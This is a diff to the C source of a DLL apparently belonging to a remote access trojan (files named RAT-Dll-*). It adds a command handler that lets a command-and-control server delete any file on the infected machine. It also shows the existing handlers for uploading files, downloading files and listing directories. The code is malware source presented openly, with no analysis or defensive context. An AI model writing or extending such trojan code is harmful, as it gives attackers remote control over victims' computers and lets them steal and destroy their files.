@@ -6,6 +6,7 @@
 #include "RAT-Dll-GetFile.h"
 #include "RAT-Dll-PutFile.h"
 #include "RAT-Dll-DirList.h"
+#include "RAT-Dll-DeleteFile.h"
 
 
 /** This function will serve as our main 'handler' for C2 requests
@@ -108,7 +109,8 @@ INT startListen()
         status = recv(clientSock, recvBuf, recvBufLen, 0);
         if (status > 0)
         {
-             // C2 told us to put a file so lets get the file path first 
+
+            // C2 told us to put a file so lets get the file path first 
             if (strcmp((const char*)&recvBuf, PUT) == 0)
             {
                 // Get the file path
@@ -192,7 +194,7 @@ INT startListen()
             }
 
             // C2 told us to get a file so lets get the file path first 
-             else if (strcmp((const char*)&recvBuf, GET) == 0)
+            else if (strcmp((const char*)&recvBuf, GET) == 0)
              {
                 // Receive our file path 
                  status = recv(clientSock, recvBuf, recvBufLen, 0);
@@ -260,8 +262,8 @@ INT startListen()
                  }
              }
 
-             // C2 says to do a dir list for specific directory 
-             else if (strcmp((const char*)&recvBuf, DIR) == 0)
+            // C2 says to do a dir list for specific directory 
+            else if (strcmp((const char*)&recvBuf, DIR) == 0)
              {
                 // Receive our directory path 
                 status = recv(clientSock, recvBuf, recvBufLen, 0);
@@ -308,6 +310,28 @@ INT startListen()
 
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully performed dir list!\n");
              }
+
+            // C2 says to delete a file from a specific path 
+            else if (strcmp((const char*)&recvBuf, DEL) == 0)
+            {
+                // Get the file path
+                status = recv(clientSock, recvBuf, recvBufLen, 0);
+                if (status == SOCKET_ERROR)
+                {
+                    // TODO: have a function call to send back failure? Request a resend?
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failed to recv (file path) %d\n", WSAGetLastError());
+                    OutputDebugStringA(msgBuf);
+                    continue; // keep trying to do things until we disconnect or receive a cleanup message
+                }
+
+                status = performDeleteFile(recvBuf);
+                if (status != SUCCESS)
+                {
+                    sprintf_s(msgBuf, "RAT-Dll-Connect::startListen - Failure recevied from performDeleteFile %d\n", status);
+                    OutputDebugStringA(msgBuf);
+                    goto cleanup;
+                }
+            }
         }
 
         else if (status == 0)
@@ -348,12 +372,3 @@ cleanup:
 }
 
 
-INT sendFiles(__in SOCKET* sock, __in char** files)
-{
-    INT status = SUCCESS;
-
-
-
-cleanup:
-    return status;
-}
